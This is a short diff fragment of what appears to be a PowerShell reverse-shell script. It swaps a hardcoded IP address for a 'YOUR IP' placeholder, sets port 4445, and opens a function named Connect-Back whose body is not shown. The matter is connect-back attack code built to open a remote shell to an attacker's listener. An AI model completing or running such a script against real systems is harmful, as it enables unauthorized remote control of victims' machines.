@@ -1,4 +1,4 @@
-$ip = "172.22.238.168"
+$ip = "YOUR IP"
 $port = 4445
 
 function Connect-Back {
